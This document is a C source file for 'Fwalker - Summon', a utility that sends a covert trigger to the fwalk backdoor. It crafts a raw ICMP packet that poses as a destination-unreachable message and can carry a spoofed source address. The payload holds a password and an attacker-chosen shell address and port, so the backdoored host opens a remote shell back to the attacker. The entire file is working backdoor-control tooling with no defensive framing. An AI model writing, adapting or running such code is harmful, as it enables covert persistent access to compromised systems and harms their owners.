/*

   Fwalker - Summon

   This util is used to trigger a shell connection from the fwalk backdoor.
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>

#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>

#include <arpa/inet.h>


#define PASSLEN 8

//
// Modify these to change the ICMP type and ICMP code.
// Defaults:
// Type 3, Destination Unreachable
// Code 0, Destination network unreachable
#define ICMPTYPE 3
#define ICMPCODE 0

//
// Function Prototypes
//

unsigned short in_cksum(unsigned short *, int);


//
// MAIN
//

int main(int argc, char *argv[])
{
    if ( argc != 6) {
        printf("usage: %s <dst addr> <password> <shell addr> <shell port> <src addr>\n", argv[0]);
        exit(1);
    }
    
    struct ip ip;
    struct icmp icmp;
    int sockfd;
    struct sockaddr_in sin;
    u_char *packet;
    const int on = 1;
    char *dstaddr = argv[1];
    char *srcaddr = argv[5];

    packet = (u_char *)malloc(60);


    struct icmp_payload {
        char pass[PASSLEN];
        struct in_addr addr;
        int port;
    } icmppayload;

    if (strlen(argv[2]) > 8) {
        perror("Password too long!");
        exit(1);
    }
    strncpy(icmppayload.pass, argv[2], (PASSLEN + 1));
    icmppayload.addr.s_addr = inet_addr(argv[3]);
    icmppayload.port = atoi(argv[4]);

   /*
    *
    * Fill in the IP header details
    *
    */

   // IP Header length in units of 4 bytes. 20 bytes total 
    ip.ip_hl = 0x5;
    
    // Protocol version
    ip.ip_v = 0x4;

    // Type of service - Packet precedence.
    ip.ip_tos = 0x0;

    // Total length for our packet in network byte-order
    ip.ip_len = htons(60);

    // ID field uniquely identifies each datagram sent by this host
    ip.ip_id = htons(12830);

    // Fragment offset - No fragmentation
    ip.ip_off = 0x0;

    // Time to live
    ip.ip_ttl = 64;

    // Upper layer protocol number
    ip.ip_p = IPPROTO_ICMP;

    // IP header checksum. - set to zero before we calculate
    ip.ip_sum = 0x0;

    // Source IP address
    ip.ip_src.s_addr = inet_addr(srcaddr);

    // Destination IP
    ip.ip_dst.s_addr = inet_addr(dstaddr);

    // Checksum
    ip.ip_sum = in_cksum((unsigned short *)&ip, sizeof(ip));

    memcpy(packet, &ip, sizeof(ip));

    /*
     *
     * ICMP Details
     *
     */

    // Type
    //icmp.icmp_type = ICMP_ECHO;
    icmp.icmp_type = ICMPTYPE;

    // Code
    icmp.icmp_code = ICMPCODE;

    // ID
    icmp.icmp_id = 1000;

    // Sequence number
    icmp.icmp_seq = 0;

    // Fwalk password
    memcpy(icmp.icmp_data, &icmppayload, sizeof(icmppayload));

    // Checksum
    icmp.icmp_cksum = 0;
    icmp.icmp_cksum = in_cksum((unsigned short *)&icmp, sizeof(icmp));

    // append the ICMP header to the packet at offset 20
    memcpy(packet + 20, &icmp, sizeof(icmp));


    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("raw socket");
        exit(1);
    }

    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt");
        exit(1);
    }

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = ip.ip_dst.s_addr;

    printf("sockfd = %d\n", sockfd);
    printf("IP size: %d\n", sizeof(ip));
    printf("ICMP size: %d\n", sizeof(icmp));
    int s = (sizeof(ip) + sizeof(icmp));
    printf("Total size: %d\n", s);
    if (sendto(sockfd, packet, s, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0) {
        perror("sendto");
        exit(1);
    }

    return 0;
}


//
// IN_CKSUM - Used to calculate checksums
//

unsigned short in_cksum(unsigned short *addr, int len)
{
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *) (&answer) = *(unsigned char *) w;
        sum += answer;
    }
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}
